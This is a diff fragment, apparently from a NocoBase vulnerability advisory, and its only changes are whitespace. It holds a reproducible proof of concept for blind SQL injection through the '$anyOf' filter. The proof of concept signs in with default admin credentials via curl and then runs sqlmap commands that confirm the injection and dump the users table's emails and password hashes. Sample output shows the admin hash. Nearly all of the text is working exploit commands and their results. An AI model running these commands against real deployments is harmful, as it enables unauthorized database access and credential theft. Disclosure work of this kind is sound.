@@ -46,23 +46,23 @@ The following reproducible test uses a collection named `vuln_array_probe` with 
 
 ```bash
 TOKEN=$(curl -s -X POST http://TARGET:13000/api/auth:signIn \
-  -H "Content-Type: application/json" \
-  -d '{"account":"admin@nocobase.com","password":"admin123"}' \
-  | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['token'])")
+ -H "Content-Type: application/json" \
+ -d '{"account":"admin@nocobase.com","password":"admin123"}' \
+ | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['token'])")
 
 sqlmap -u "http://TARGET:13000/api/vuln_array_probe:list?pageSize=100&filter=%7B%22tags%22%3A%20%7B%22%24anyOf%22%3A%20%5B%22*%22%5D%7D%7D" \
-  --header="Authorization: Bearer $TOKEN" \
-  --header="X-Authenticator: basic" \
-  --dbms=sqlite --technique=B --batch --level=3 --threads=4 --banner
+ --header="Authorization: Bearer $TOKEN" \
+ --header="X-Authenticator: basic" \
+ --dbms=sqlite --technique=B --batch --level=3 --threads=4 --banner
 ```
 
 Result:
 
 ```
 Parameter: #1* (URI)
-    Type: boolean-based blind
-    Title: HAVING boolean-based blind - WHERE, GROUP BY clause
-    Payload: ...filter={"tags": {"$anyOf": ["')) HAVING 7965=7965 AND (('ZrTS'='ZrTS"]}}
+ Type: boolean-based blind
+ Title: HAVING boolean-based blind - WHERE, GROUP BY clause
+ Payload: ...filter={"tags": {"$anyOf": ["')) HAVING 7965=7965 AND (('ZrTS'='ZrTS"]}}
 
 back-end DBMS: SQLite
 banner: '3.44.2'
@@ -72,17 +72,17 @@ banner: '3.44.2'
 
 ```bash
 sqlmap -u "http://TARGET:13000/api/vuln_array_probe:list?pageSize=100&filter=%7B%22tags%22%3A%20%7B%22%24anyOf%22%3A%20%5B%22*%22%5D%7D%7D" \
-  --header="Authorization: Bearer $TOKEN" \
-  --header="X-Authenticator: basic" \
-  --dbms=sqlite --technique=B --batch --level=3 --threads=4 \
-  -T users -C email,password --dump
+ --header="Authorization: Bearer $TOKEN" \
+ --header="X-Authenticator: basic" \
+ --dbms=sqlite --technique=B --batch --level=3 --threads=4 \
+ -T users -C email,password --dump
 ```
 
 Result:
 
 ```
 +--------------------+------------------------------------------------------------------+
-| email              | password                                                         |
+| email | password |
 +--------------------+------------------------------------------------------------------+
 | admin@nocobase.com | 2f884850763fff97342c994f83ee45a9806c291e02a0ccc9e4da9476cad5ecde |
 +--------------------+------------------------------------------------------------------+
